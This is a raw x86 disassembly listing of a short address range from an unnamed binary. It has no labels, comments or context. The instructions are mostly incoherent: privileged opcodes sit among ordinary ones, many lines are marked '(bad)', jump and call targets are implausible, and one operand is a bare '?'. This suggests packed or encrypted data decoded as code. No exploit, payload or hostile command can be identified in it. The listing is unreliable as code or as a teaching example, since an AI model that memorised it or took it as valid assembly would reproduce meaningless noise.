  43236d:	ret    0x0
  432370:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  432376:	xor    ecx,DWORD PTR [edi]
  432378:	add    eax,DWORD PTR [ecx+0x3b]
  43237b:	push   ebx
  43237c:	rdpmc  
  43237e:	out    0x8d,al
  432380:	add    BYTE PTR [eax],cl
  432382:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  432388:	ret    0x450c
  43238b:	sbb    al,0x8b
  43238d:	cmp    eax,esi
  43238f:	or     cl,al
  432391:	or     al,0xc2
  432393:	pop    eax
  432394:	inc    ebp
  432395:	add    ecx,DWORD PTR [edi]
  432397:	add    esi,DWORD PTR [ebp+0x39]
  43239a:	invd   
  43239c:	jge    0x4323a8
  43239e:	mov    eax,0x478ac0
  4323a3:	cli    
  4323a4:	xor    esp,ecx
  4323a6:	mov    ebx,0x5b8ac0
  4323ab:	ret    0x33
  4323ae:	mov    eax,0x833b8b
  4323b3:	sub    BYTE PTR [ebx],al
  4323b5:	inc    ebp
  4323b6:	xor    ax,di
  4323b9:	pushf  
  4323ba:	inc    bh
  4323bc:	mov    esp,esp
  4323be:	hlt    
  4323bf:	test   DWORD PTR [ebp-0x8],esi
  4323c2:	mov    eax,DWORD PTR [ebp-0x14]
  4323c5:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4323cb:	dec    edi
  4323cc:	or     BYTE PTR [eax],al
  4323ce:	jne    0x432359
  4323d0:	mov    esi,esp
  4323d2:	call   0x77a9af97
  4323d7:	inc    ebp
  4323d8:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4323de:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4323e4:	add    BYTE PTR [esi+0x7d],ah
  4323e7:	inc    ebp
  4323e8:	mov    bx,WORD PTR [ebp+0x8]
  4323ec:	add    DWORD PTR [ebp+0x54],0x30c008b
  4323f3:	inc    ebp
  4323f4:	mov    bx,di
  4323f7:	lock test BYTE PTR [ecx+0x7000801],bh
  4323fe:	jge    0x4323c1
  432400:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  432406:	cli    
  432407:	xor    bl,bh
  432409:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  43240f:	test   BYTE PTR [eax],cl
  432411:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  432418:	cmp    ebp,eax
  43241a:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432421:	test   BYTE PTR [ebp+0x1],bh
  432424:	mov    ebx,0x458a00
  432429:	xor    esi,DWORD PTR [ebx]
  43242b:	add    esp,DWORD PTR [esi-0x77]
  43242e:	pop    ebp
  43242f:	loopne 0x432497
  432431:	inc    ebp
  432432:	clc    
  432433:	xor    edi,DWORD PTR [ebx]
  432435:	add    esi,DWORD PTR [edx-0x77]
  432438:	data16 fdivr QWORD PTR [ebp-0x49]
  43243c:	mov    ebx,0xb78afc
  432441:	hlt    
  432442:	xor    edi,DWORD PTR [esi+eiz*2]
  432445:	add    BYTE PTR [ebp+0x66],bl
  432448:	data16 lock clc 
  43244b:	cmp    al,0x3b
  43244d:	add    BYTE PTR [edi+0x66],dh
  432450:	psubq  mm7,QWORD PTR [ebp+0x2]
  432454:	ltr    WORD PTR [ebp+0x66]
  432458:	add    esi,eax
  43245a:	add    di,WORD PTR [ebp+0x2b]
  43245e:	data16 data16 jge 0x4324df
  432462:	mov    ebx,0xe08a8b
  432467:	jge    0x43249c
  432469:	data16 data16 xor al,0x5d
  43246d:	data16 data16 jne 0x432469
  432471:	mov    edi,DWORD PTR [ebx]
  432473:	fdiv   QWORD PTR [edx+0x7d]
  432476:	data16 data16 jge 0x4324ae
  43247a:	mov    ebx,0x758a66
  43247f:	mov    esi,0x667233
  432484:	pop    ebp
  432485:	or     BYTE PTR [esi+0x0],ah
  432488:	clc    
  432489:	mov    edi,DWORD PTR [ebx]
  43248b:	lock ja 0x432419
  43248e:	(bad)  
  432490:	jge    0x432489
  432492:	invd   
  432494:	pop    ebp
  432495:	add    BYTE PTR [ebx],al
  432497:	(bad)  
  432498:	cmp    di,WORD PTR [ebp+0xf]
  43249c:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4324a0:	mov    bx,WORD PTR [ebp-0x10]
  4324a4:	pop    bp
  4324a6:	fbstp  TBYTE PTR [ebx]
  4324a8:	test   DWORD PTR [ebx],eax
  4324aa:	add    BYTE PTR [ebx],bh
  4324ac:	add    BYTE PTR [esi+0x7d],ah
  4324af:	jge    0x43243c
  4324b1:	data16 in al,dx
  4324b3:	pop    ebp
  4324b4:	stc    
  4324b5:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4324bc:	mov    edi,ebx
  4324be:	in     al,dx
  4324bf:	test   BYTE PTR [ebp+0x0],bh
  4324c2:	mov    eax,DWORD PTR [eax]
  4324c4:	call   0xbd401e54
  4324c9:	cmp    al,0x9b
  4324cb:	add    BYTE PTR [edx],dh
  4324cd:	mov    bx,di
  4324d0:	call   0x8b4ba260
  4324d5:	add    ebp,esp
  4324d7:	mov    bx,di
  4324da:	jnp    0x432502
  4324dc:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4324e2:	mov    eax,DWORD PTR [eax]
  4324e4:	call   0x7c3eb04f
  4324e9:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  4324ef:	data16 data16 fistp WORD PTR [ebp+0xe]
  4324f4:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  4324fe:	fisttp WORD PTR [ecx-0x7401f77b]
  432504:	(bad)  
  432505:	cld    
  432506:	jne    0x432544
  432508:	xor    eax,DWORD PTR [eax]
  43250a:	mov    esp,DWORD PTR [esi-0x10]
  43250d:	sti    
  43250e:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432515:	data16 adc bl,bh
  432518:	push   ebp
  432519:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432520:	mov    WORD PTR [eax],es
  432522:	fwait
  432523:	data16 xor bh,bl
  432526:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  43252c:	mov    esp,DWORD PTR [esi-0x14]
  43252f:	fisttp WORD PTR [ebx-0x3748a9f2]
  432535:	or     al,0x2b
  432537:	mov    bh,0xba
  432539:	hlt    
  43253a:	mov    bh,bl
  43253c:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432542:	dec    esi
  432543:	or     al,0x0
  432545:	mov    edi,DWORD PTR [ebx]
  432547:	or     BYTE PTR [ebp+0x3b],dh
  43254a:	mov    ecx,DWORD PTR [edi]
  43254c:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432552:	xor    al,0xd8
  432554:	pop    bp
  432556:	lock xor esi,DWORD PTR [ebx]
  432559:	lea    esp,[esi+0x1f]
  43255c:	icebp  
  43255d:	jb     0x432563
  43255f:	add    al,al
  432561:	jge    0x43256f
  432563:	mov    eax,eax
  432565:	fsubr  st,st(3)
  432567:	pop    ebp
  432568:	mov    esi,DWORD PTR [ebx]
  43256a:	in     al,0x8d
  43256c:	rcr    DWORD PTR [edi],0xc2
  43256f:	jb     0x4325cf
  432571:	add    cl,cl
  432573:	jge    0x432581
  432575:	mov    edx,DWORD PTR [ebp-0x20]
  432578:	in     al,dx
  432579:	pop    ebp
  43257a:	data16 data16 or BYTE PTR [esi+edi*4],bh
  43257f:	cmp    di,WORD PTR [ebp+0x0]
  432583:	mov    ebp,DWORD PTR [ebx]
  432585:	fdivr  QWORD PTR [esi+0x668a5d]
  43258b:	cmp    al,0x33
  43258d:	mov    si,0x4e7d
  432591:	mov    eax,DWORD PTR [eax]
  432593:	lock inc ebp
  432595:	mov    esi,DWORD PTR [eax]
  432597:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  43259e:	clc    
  43259f:	(bad)  
  4325a0:	cmp    edi,DWORD PTR [ebx]
  4325a2:	je     0x4325b3
  4325a4:	push   ebx
  4325a5:	loopne 0x4325b6
  4325a7:	dec    ecx
  4325a9:	mov    esp,DWORD PTR [ebp-0x1c]
  4325ac:	int    0xf1
  4325ae:	mov    esi,0x703084d
  4325b3:	pcmpgtd mm6,mm1
  4325b6:	add    BYTE PTR [ebp+0x66],dh
  4325b9:	jmp    0x432586
  4325bb:	mov    eax,DWORD PTR [ebx]
  4325bd:	lock push ebp
  4325bf:	ror    DWORD PTR [ebp-0x2972feb3],1
  4325c5:	or     bh,dl
  4325c7:	jb     0x4325c7
  4325c9:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4325cf:	loopne 0x4325d1
  4325d1:	jne    0x4325d5
  4325d3:	data16 add BYTE PTR [esi+eiz*2],dh
  4325d7:	mov    ecx,ebx
  4325d9:	data16 cmp al,0xf1
  4325dc:	add    BYTE PTR [esi+eiz*2],bh
  4325df:	add    bl,cl
  4325e1:	retw   0xf2
  4325e5:	ret    0x66
  4325e8:	retf   
  4325e9:	enterw 0x4df1,0x19
  4325ee:	pop    edi
  4325ef:	jne    0x432572
  4325f1:	mov    esi,DWORD PTR [eax]
  4325f3:	call   0x77b7b194
  4325f8:	xor    ebp,DWORD PTR [ebx]
  4325fa:	lea    esp,[esi+0x48]
  4325fd:	repnz in eax,0x3b
  432600:	add    BYTE PTR [ebp-0x37],dh
  432603:	xor    edx,DWORD PTR [ebp-0x15]
  432606:	in     al,dx
  432607:	xor    edx,DWORD PTR [esi+0x40]
  43260a:	mov    DWORD PTR [edi],0x338545fc
  432610:	clc    
  432611:	add    esi,DWORD PTR [ecx]
  432613:	pop    edi
  432614:	pushf  
  432615:	pop    ebx
  432616:	call   0xff4425dd
  43261b:	mov    edi,eax
  43261d:	push   ecx
  43261e:	pop    es
  43261f:	mov    edi,DWORD PTR [eax]
  432621:	push   esi
  432622:	inc    esi
  432623:	add    bh,BYTE PTR [esi+0x0]
  432626:	popa   
  432627:	data16 (bad) 
  432629:	into   
  43262a:	gs cmp al,0xcd
  43262d:	add    BYTE PTR [ecx+0x7ce0866],bh
  432633:	ret    0x66
  432636:	add    bh,al
  432638:	add    bh,ah
  43263a:	add    BYTE PTR [ebp+0x31c3f866],al
  432640:	cmp    al,0x9c
  432642:	add    BYTE PTR [esi+0x66],ah
  432645:	into   
  432646:	ret    
  432647:	pop    ebp
  432648:	adc    BYTE PTR [edi+0x0],dl
  43264b:	mov    bh,0x66
  43264d:	mov    edi,0xff038dc3
  432652:	jne    0x4326a8
  432654:	lea    edx,[ecx+0x1]
  432657:	mov    ebx,0xd64ff1
  43265c:	sar    DWORD PTR [ebx],1
  43265e:	test   BYTE PTR [ebp+0x36],dh
  432661:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432665:	push   edi
  432666:	xor    BYTE PTR [ebx],0x38
  432669:	mov    esi,ebx
  43266b:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432671:	ss inc ebp
  432673:	fs pop ebx
  432675:	mov    ebx,0x9c3b30
  43267a:	je     0x4326a7
  43267c:	xor    edi,DWORD PTR [ebx+0x668a33]
  432682:	mov    WORD PTR [ebx],?
  432684:	ss mov ebx,0x8b4e64
  43268a:	pop    edi
  43268b:	cmp    ecx,ecx
  43268d:	jne    0x4326e4
  43268f:	mov    ebp,esp
  432691:	cld    
  432692:	push   esi
  432693:	pop    ebx
  432694:	inc    ebp
  432695:	stc    
  432696:	xor    BYTE PTR [ebp+0x9bef89c],al
  43269c:	test   esi,ecx
  43269e:	clc    
  43269f:	test   dl,dl
  4326a1:	cmp    bh,bh
  4326a3:	fs pop si
  4326a6:	or     bl,al
  4326a8:	add    cl,BYTE PTR [ebx+0x57665100]
  4326ae:	retf   0x3c45
  4326b1:	xor    BYTE PTR [eax],al
  4326b3:	pushf  
  4326b4:	mov    si,0x85ca
  4326b8:	ret    0xf8
  4326bb:	pop    ebx
  4326bc:	dec    dx
  4326bf:	mov    edx,DWORD PTR [edi-0x76]
  4326c2:	push   edi
  4326c3:	add    al,0xb7
  4326c5:	xor    al,0xba
  4326c7:	cmp    al,0x8d
  4326c9:	je     0x4326ca
  4326cb:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4326cf:	lea    edi,[ebx+0x544fff]
  4326d5:	push   ecx
  4326d6:	cmp    edx,DWORD PTR [ebx+0x75]
  4326d9:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4326df:	add    BYTE PTR [ebx],dh
  4326e1:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4326e7:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  4326ee:	mov    ebx,0x3b3b00
  4326f3:	jne    0x432720
  4326f5:	mov    DWORD PTR [ebx+0x728afc],edi
  4326fb:	xor    esi,DWORD PTR [ebx]
  4326fd:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432703:	push   edi
  432704:	cmp    esp,ebp
  432706:	jne    0x432708
  432708:	sbb    DWORD PTR [eax],0x8085c3fc
  43270e:	clc    
  43270f:	inc    esi
  432710:	pop    ebx
  432711:	sti    
  432712:	add    eax,0xeb8bc075
  432717:	cld    
  432718:	xor    edi,DWORD PTR ds:0xf8c3855e
  43271e:	mov    ecx,DWORD PTR [ecx+edx*2]
  432721:	rol    DWORD PTR [ebp-0x37],0xf
  432725:	mov    DWORD PTR [eax],ecx
  432727:	inc    edi
  432728:	(bad)  
  432729:	in     eax,0xfe
  43272b:	add    bh,bh
  43272d:	(bad)  
  43272e:	mov    esi,0xc38a5e
  432733:	mov    esi,DWORD PTR [ebx]
  432735:	push   ecx
  432736:	mov    edi,0xfc4ec7
  43273b:	test   DWORD PTR [ebp-0x8],edx
  43273e:	xor    di,ax
  432741:	pushf  
  432742:	sub    ebp,eax
  432744:	inc    ebp
  432745:	(bad)  
  432746:	sub    edi,edi
  432748:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  43274e:	inc    ebp
  43274f:	add    BYTE PTR [esi+0x2b],ah
  432752:	or     bh,BYTE PTR [edx+0xf8ac2]
  432758:	cmp    al,0x33
  43275a:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432760:	(bad)  
  432761:	cmp    esi,DWORD PTR [ebx]
  432763:	je     0x43271d
  432765:	push   ebx
  432766:	dec    esi
  432767:	str    ecx
  43276a:	cmp    esp,DWORD PTR [ebp+0x75]
  43276d:	int    0x33
  43276f:	mov    edi,0x789085f
  432774:	mov    edx,DWORD PTR [eax]
  432776:	cld    
  432777:	add    cl,cl
  432779:	data16 add al,0xcb
  43277c:	push   ebp
  43277d:	add    ebp,esp
  43277f:	jne    0x43276d
  432781:	(bad)  
  432782:	mov    DWORD PTR [ecx],0xd685f7ec
  432788:	clc    
  432789:	xlat   BYTE PTR ds:[ebx]
  43278a:	inc    ebp
  43278b:	mov    esi,DWORD PTR [edx]
  43278d:	push   eax
  43278e:	pushf  
  43278f:	in     eax,0x8b
  432791:	add    ah,ch
  432793:	add    dl,BYTE PTR [eax+eax*1+0x51]
  432797:	add    ax,0x72cb
  43279b:	cmp    al,0x0
  43279d:	add    BYTE PTR [ebp+0x66],al
  4327a0:	(bad)  
  4327a1:	retf   
  4327a2:	lock ret 0x85
  4327a6:	clc    
  4327a7:	inc    bp
  4327a9:	retf   
  4327aa:	cmp    eax,0xc77d9cc8
  4327af:	xor    ah,bh
  4327b1:	pushf  
  4327b2:	test   DWORD PTR [edi-0x8],ebx
  4327b5:	je     0x4327fc
  4327b7:	xor    esi,DWORD PTR ds:0x7020840
  4327bd:	ror    BYTE PTR [ebp-0x37],0x8d
  4327c1:	push   ebp
  4327c2:	add    esp,ebp
  4327c4:	jb     0x432751
  4327c6:	add    BYTE PTR [eax],cl
  4327c8:	dec    ebp
  4327c9:	mov    bh,0x81
  4327cb:	push   esi
  4327cc:	push   esp
  4327cd:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4327d4:	xor    al,BYTE PTR [eax]
  4327d6:	mov    edx,DWORD PTR [edi+0x10]
  4327d9:	(bad)  
  4327da:	scas   eax,DWORD PTR es:[edi]
  4327db:	ret    0x3b
  4327de:	jns    0x3b4424d1
  4327e4:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4327e8:	dec    ebp
  4327e9:	or     BYTE PTR [ebx],ch
  4327eb:	ret    0x458b
  4327ee:	lock jmp 0x4327e2
  4327f1:	mov    ecx,DWORD PTR [eax]
  4327f3:	or     BYTE PTR [edi],al
  4327f5:	mov    ecx,eax
  4327f7:	xor    DWORD PTR [edx+0x2],0x0
  4327fb:	mov    bh,0xc1
  4327fd:	adc    BYTE PTR [eax],dh
  4327ff:	iret   
  432800:	inc    ebp
  432801:	mov    DWORD PTR [ebx],0x4dfff8c4
  432807:	inc    BYTE PTR [ebx]
  432809:	ret    0xf8
  43280c:	adc    DWORD PTR [esi+0x10],esp
  43280f:	clc    
  432810:	dec    ecx
  432811:	fisttp WORD PTR [ecx+0x456604c0]
  432817:	add    dh,BYTE PTR ds:0x75e0845
  43281d:	ret    0x4d
  432820:	lea    ecx,[ebx+0x18728301]
  432826:	add    BYTE PTR [ebp+0x45],al
  432829:	xor    ecx,ebp
  43282b:	pushf  
  43282c:	add    bh,al
  43282e:	add    al,ch
  432830:	inc    ebp
  432831:	test   DWORD PTR [ebx-0x3eba0708],ecx
  432837:	xor    eax,0x781084d
  43283c:	push   esp
  43283d:	fwait
  43283e:	push   ecx
  43283f:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432845:	inc    ebp
  432846:	cmp    edi,DWORD PTR [ecx]
  432848:	jbe    0x4327e6
  43284a:	mov    eax,edi
  43284c:	or     ah,dh
  43284e:	inc    ebp
  43284f:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432855:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43285b:	in     al,dx
  43285c:	hlt    
  43285d:	push   esp
  43285e:	push   esp
  43285f:	push   ecx
  432860:	push   ecx
  432861:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  432867:	fwait
  432868:	fwait
  432869:	xor    dh,BYTE PTR [edx]
  43286b:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432871:	or     BYTE PTR [ebp+0x7],al
  432874:	mov    eax,ecx
  432876:	clc    
  432877:	jb     0x43283a
  432879:	add    BYTE PTR [ebp+0x55],cl
  43287c:	or     DWORD PTR [edi],0xc251d154
  432882:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  43288c:	mov    edi,eax
  43288e:	or     cl,al
  432890:	inc    ebp
  432891:	dec    ebp
  432892:	mov    eax,DWORD PTR [ecx+0x514d540c]
  432898:	or     WORD PTR [ecx],0x899b
  43289d:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4328a3:	mov    edx,DWORD PTR [ecx+0x8]
  4328a6:	mov    eax,DWORD PTR [ebp-0x8]
  4328a9:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4328b0:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4328b6:	inc    ebp
  4328b7:	dec    eax
  4328b8:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4328be:	add    edx,DWORD PTR [ecx-0x8]
  4328c1:	mov    ecx,DWORD PTR [ecx]
  4328c3:	clc    
  4328c4:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4328cb:	mov    ecx,ebp
  4328cd:	clc    
  4328ce:	(bad)  
  4328cf:	popf   
  4328d0:	inc    DWORD PTR [eax]
  4328d2:	ret    0x8b
  4328d5:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4328db:	mov    edi,esp
  4328dd:	hlt    
  4328de:	test   ecx,esi
  4328e0:	clc    
  4328e1:	or     BYTE PTR [ebp+0x7],al
  4328e4:	xor    al,cl
  4328e6:	pushf  
  4328e7:	jb     0x43291c
  4328e9:	add    BYTE PTR [eax-0x3f],al
  4328ec:	inc    eax
  4328ed:	daa    
  4328ee:	inc    ebp
  4328ef:	inc    ebp
  4328f0:	xor    eax,0x7f80803
  4328f5:	dec    ebp
  4328f6:	fwait
  4328f7:	add    esi,DWORD PTR [edx]
  4328f9:	clc    
  4328fa:	cmp    DWORD PTR [ecx],ecx
  4328fc:	or     al,0x8
  4328fe:	add    al,BYTE PTR [ebp+0x2c]
  432901:	xor    eax,0x7350845
  432906:	or     BYTE PTR [ebp+0x7],cl
  432909:	lea    ebx,[ebx-0x748dcdff]
  43290f:	add    BYTE PTR [eax*2-0x74b21438],cl
  432916:	mov    edx,DWORD PTR [eax]
  432918:	cld    
  432919:	dec    ebp
  43291a:	push   esp
  43291b:	sub    edx,DWORD PTR [ecx-0x75]
  43291e:	add    eax,0xf172fc
  432923:	or     BYTE PTR [ebp+0x7],cl
  432926:	add    eax,ecx
  432928:	or     al,0x72
  43292a:	add    DWORD PTR [eax],eax
  43292c:	mov    ebx,0x29c2c1
  432931:	inc    ebp
  432932:	mov    eax,DWORD PTR [ebx]
  432934:	cmp    eax,0x3004d1c
  43293a:	xbegin 0x66c8b534
  432940:	clc    
  432941:	or     BYTE PTR [ebp+0x45],al
  432944:	xor    dh,BYTE PTR ds:0x78b089c
  43294a:	adc    BYTE PTR [ebp+0x45],cl
  43294d:	lea    eax,[ebp+0x33727501]
  432953:	add    cl,ch
  432955:	inc    ebp
  432956:	add    bl,ch
  432958:	add    BYTE PTR [ebx+0x45850845],cl
  43295e:	je     0x4328eb
  432960:	push   ebx
  432961:	or     al,0x85
  432963:	dec    ebp
  432964:	std    
  432965:	mov    bh,bh
  432967:	mov    BYTE PTR [ebp-0x75],al
  43296a:	mov    edi,eax
  43296c:	or     al,0x89
  43296e:	inc    ebp
  43296f:	clc    
  432970:	mov    esp,esp
  432972:	hlt    
  432973:	call   DWORD PTR [edi-0x37]
  432976:	push   esp
  432977:	or     al,0x51
  432979:	push   ebp
  43297a:	xor    ebp,esp
  43297c:	mov    esi,0x457251
  432981:	xor    esi,eax
  432983:	pushf  
  432984:	inc    ebp
  432985:	(bad)  
  432986:	mov    edi,eax
  432988:	or     al,0x85
  43298a:	add    al,bh
  43298c:	inc    eax
  43298e:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  432992:	or     ah,bh
  432994:	inc    eax
  432995:	push   esp
  432996:	jmp    0x4329e9
  432998:	mov    eax,DWORD PTR ds:0xe8720c
  43299e:	mov    DWORD PTR [ebp-0x8],eax
  4329a1:	jne    0x4329e8
  4329a3:	jmp    0x432930
  4329a5:	mov    ebp,DWORD PTR [eax]
  4329a7:	clc    
  4329a8:	retf   0xff54
  4329ab:	push   ecx
  4329ac:	mov    DWORD PTR ds:0x757210,eax
  4329b2:	mov    ecx,DWORD PTR [ebp-0x4]
  4329b5:	sub    esp,DWORD PTR [ebx-0x77]
  4329b8:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4329bf:	or     ah,bh
  4329c1:	pop    es
  4329c2:	ds fwait
  4329c4:	push   DWORD PTR [edx]
  4329c6:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4329cc:	(bad)  
  4329cd:	mov    bh,bh
  4329cf:	jmp    0x4329bd
  4329d1:	leave  
  4329d2:	jne    0x4329dc
  4329d4:	call   0x30232e
  4329d9:	in     al,dx
  4329da:	dec    ebp
  4329db:	add    dh,BYTE PTR [ebx]
  4329dd:	add    BYTE PTR [ebx],al
  4329df:	inc    ebp
  4329e0:	cmp    esi,DWORD PTR [ecx]
  4329e2:	je     0x432980
  4329e4:	mov    eax,edi
  4329e6:	or     al,0xf0
  4329e8:	add    BYTE PTR [ebp+0x458bf845],al
  4329ee:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4329f4:	adc    al,0x7
  4329f6:	enter  0x9fc0,0xa5
  4329fa:	rol    BYTE PTR [eax],0x5e
  4329fd:	mov    ecx,ecx
  4329ff:	or     al,0xc
  432a01:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  432a08:	jmp    0x432a09
  432a0a:	push   ebp
  432a0b:	mov    esp,ebp
  432a0d:	cld    
  432a0e:	inc    ebp
  432a0f:	inc    ebp
  432a10:	or     DWORD PTR [ecx+0x457dec10],0x0
  432a17:	push   esi
  432a18:	push   esi
  432a19:	mov    edi,0x7af080f
  432a1e:	add    bh,al
  432a20:	test   DWORD PTR [ebx+0x3a7320f],ebx
  432a26:	add    BYTE PTR [ecx+0x4540100f],cl
  432a2c:	mov    ebp,eax
  432a2e:	mov    ebp,edi
  432a30:	lock call edx
  432a33:	fcom   DWORD PTR [ebp+0x45]
  432a36:	mov    eax,0x148a8b
  432a3b:	push   ecx
  432a3c:	enter  0xc145,0x83
  432a40:	cmp    ecx,DWORD PTR [eax]
  432a42:	add    BYTE PTR [ebp+0x4d],al
  432a45:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  432a4b:	call   0xffa325ba
  432a50:	cmp    eax,DWORD PTR [ebp-0xc]
  432a53:	jmp    DWORD PTR [eax+edx*1-0x4e]
  432a57:	push   ebp
  432a58:	(bad)  
  432a59:	call   0x34285d
  432a5e:	mov    bh,0xdb
  432a60:	cld    
  432a61:	or     BYTE PTR [ebp+0x45],bl
  432a64:	(bad)  
  432a65:	call   0xff7d26f5
  432a6a:	add    al,BYTE PTR [ebp+0x37]
  432a6d:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  432a73:	jne    0x432a75
  432a75:	(bad)  
  432a76:	cmp    edi,esp
  432a78:	jne    0x432aab
  432a7a:	mov    edi,edi
  432a7c:	or     BYTE PTR [ebx-0x307f0b49],cl
  432a82:	pop    ds
  432a83:	into   
  432a84:	je     0x432a47
  432a86:	mov    ebx,DWORD PTR [esi]
  432a88:	or     BYTE PTR [ebp-0x49],al
  432a8b:	mov    esp,DWORD PTR [esi-0x77]
  432a8e:	mov    esi,0x2451f0c
  432a93:	mov    eax,DWORD PTR [eax]
  432a95:	or     al,0x66
  432a97:	sar    bl,0x3b
  432a9a:	xor    esi,DWORD PTR [ebp+0x66]
  432a9d:	xor    ecx,edi
  432a9f:	pop    edi
  432aa0:	adc    bl,BYTE PTR [ebx+0x7e]
  432aa3:	ret    0xff
  432aa6:	cld    
  432aa7:	inc    ebp
  432aa8:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  432aae:	cld    
  432aaf:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  432ab6:	push   0xffffff83
  432ab8:	pop    edi
  432ab9:	or     BYTE PTR [ebp+0x53],dh
  432abc:	xorps  xmm1,xmm2
  432abf:	test   BYTE PTR [eax+eax*1],bh
  432ac2:	add    BYTE PTR [eax],al
  432ac4:	adc    eax,eax
  432ac6:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  432ace:	jmp    DWORD PTR [eax]
  432ad0:	ror    al,0x5e
  432ad3:	inc    ebp
  432ad4:	leave  
  432ad5:	xor    ecx,DWORD PTR [eax]
  432ad7:	and    DWORD PTR [ebx-0x3ec30708],ecx
  432add:	add    ah,al
  432adf:	xor    edi,edi
  432ae1:	xor    DWORD PTR [ebx],0x66003302
  432ae7:	mov    DWORD PTR [ebp-0xc],ecx
  432aea:	pcmpgtw mm0,mm0
  432aed:	add    dl,ah
  432aef:	leave  
  432af0:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  432af4:	push   eax
  432af5:	dec    ebp
  432af6:	mov    esi,DWORD PTR [ebx-0x75]
  432af9:	lea    ebp,[eax-0x7c00ff02]
  432aff:	xor    eax,DWORD PTR [eax]
  432b01:	sysret 
  432b03:	dec    ebp
  432b04:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  432b0b:	push   WORD PTR [ecx+0x8]
  432b0f:	jne    0x432ad2
  432b11:	ud0    ecx,DWORD PTR [ecx]
  432b14:	mov    eax,edx
  432b16:	lods   al,BYTE PTR ds:[esi]
  432b17:	add    BYTE PTR [eax],al
  432b19:	data16 (bad) 
  432b1b:	iret   
  432b1c:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  432b23:	cli    
  432b24:	inc    ebp
  432b25:	cmp    al,0x8d
  432b27:	add    BYTE PTR [esi+0x2d],ah
  432b2a:	inc    ebp
  432b2b:	pop    ebp
  432b2c:	lea    ecx,[edi]
  432b2e:	mov    dl,bh
  432b30:	add    BYTE PTR [edi],cl
  432b32:	mov    DWORD PTR [eax+eax*8],edi
  432b35:	mov    ebx,0x3b87
  432b3a:	add    BYTE PTR [ebx],ch
  432b3c:	inc    ebp
  432b3d:	data16 (bad) 
  432b3f:	clc    
  432b40:	int3   
  432b41:	cmp    eax,DWORD PTR [eax]
  432b43:	je     0x432ace
  432b45:	push   0xffffffc8
  432b47:	pop    edi
  432b48:	xchg   DWORD PTR [ebp+0x0],eax
  432b4b:	data16 add BYTE PTR [ebp+0x45],cl
  432b4f:	lea    cx,[ebp+0x10]
  432b53:	jb     0x432b55
  432b55:	jmp    0x432ae0
  432b57:	call   eax
  432b59:	clc    
  432b5a:	xchg   DWORD PTR [edi+0x1],edi
  432b5d:	mov    eax,DWORD PTR [eax]
  432b5f:	or     BYTE PTR [ebp-0x49],al
  432b62:	lea    eax,[eax+0x74003154]
  432b68:	push   edi
  432b69:	inc    edx
  432b6a:	jge    0x432b6b
  432b6c:	mov    DWORD PTR [edi],ecx
  432b6e:	fdiv   DWORD PTR [edi-0x6]
  432b71:	inc    DWORD PTR [eax]
  432b73:	xor    edx,DWORD PTR [eax+0x5f]
  432b76:	xchg   DWORD PTR [ebx+0x1],ebx
  432b79:	ret    0x0
  432b7c:	xor    BYTE PTR [ebp-0x51],cl
  432b7f:	cmp    edi,0xf0ff89fe
  432b85:	data16 ror al,0x84
  432b89:	rol    BYTE PTR [eax],0x3b
  432b8c:	add    al,dh
  432b8e:	dec    eax
  432b8f:	xchg   esp,eax
  432b90:	push   ebx
  432b91:	jmp    0x432b1e
  432b93:	push   ebp
  432b94:	add    esp,ebp
  432b96:	add    ebp,esp
  432b98:	mov    edx,DWORD PTR [edi+0x24]
  432b9b:	clc    
  432b9c:	dec    esi
